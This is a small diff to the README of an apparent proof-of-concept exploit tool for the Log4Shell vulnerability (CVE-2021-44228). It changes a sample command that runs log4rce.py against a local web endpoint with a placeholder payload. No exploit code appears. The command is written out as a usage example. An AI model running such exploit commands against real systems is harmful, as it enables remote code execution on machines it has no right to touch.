@@ -5,7 +5,7 @@ An all-in-one pure Python3 PoC for [CVE-2021-44228](https://cve.mitre.org/cgi-bi
 ## Sample
 
 ```bash
-> python3 log4rce.py --target "linux" --payload "PAYLOAD" http --url "http://localhost:8080/" --data "address=###"
+> python3 log4rce.py --target "linux" --payload "PAYLOAD" http -X POST --url "http://localhost:8080/" --data "address=###"
 ```
 
 ```
